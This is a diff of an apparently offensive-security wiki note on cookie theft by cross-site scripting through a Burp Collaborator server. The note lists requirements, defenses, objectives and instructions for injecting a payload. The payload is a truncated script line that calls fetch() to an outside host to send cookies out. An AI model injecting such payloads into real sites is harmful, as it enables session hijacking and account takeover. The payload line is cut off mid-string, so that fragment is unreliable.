@@ -32,6 +32,8 @@ Cross-Site Scripting (XSS) is a type of injection attack where an attacker injec
 
 Cross-Site Scripting (XSS) is a type of injection attack where an attacker injects malicious code into a web page viewed by other users. In this case, the attacker uses a Burp Collaborator server to steal cookies from the victim's browser. The attacker can then use the stolen cookies to impersonate the victim and gain access to sensitive information. To execute this attack, the attacker first finds a vulnerable web application that allows them to inject malicious code. They then inject the Burp Collaborator server script, which sends the stolen cookies to the attacker's server. This attack can be used for initial access and execution.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable web application
@@ -39,6 +41,8 @@ Cross-Site Scripting (XSS) is a type of injection attack where an attacker injec
 1. Burp Suite installed
 
 1. Burp Collaborator server
+
+ 
 
 ## Defense
 
@@ -48,6 +52,8 @@ Cross-Site Scripting (XSS) is a type of injection attack where an attacker injec
 
 1. Implement Content Security Policy (CSP) to restrict the sources of content that can be loaded on a web page
 
+ 
+
 ## Objectives
 
 1. Steal cookies from the victim's browser
@@ -56,12 +62,20 @@ Cross-Site Scripting (XSS) is a type of injection attack where an attacker injec
 
 1. Gain access to sensitive information
 
+ 
+
 # Instructions
 
 1. To use this command, replace <SESSION> with your Burp Collaborator session ID and inject the payload into a vulnerable web application. When a victim visits the page, their cookies will be sent to your Burp Collaborator server.
 
+ 
+
+
+
 **Code**: [[<script>
   fetch('https://<SESSION>.burpcollaborat]]
+
+
 
 > This command uses a payload to steal cookies from a victim's browser and send them to a Burp Collaborator server. The payload is injected into a vulnerable web application and when a victim visits the page, their cookies are sent to the specified Burp Collaborator server. The stolen cookies can then be used to impersonate the victim and gain unauthorized access to their account.
 
@@ -84,3 +98,5 @@ Cross-Site Scripting (XSS) is a type of injection attack where an attacker injec
 - [[CORS]]
 - [[Cross Site Scripting]]
 - [[Exploit code or POC]]
+
+
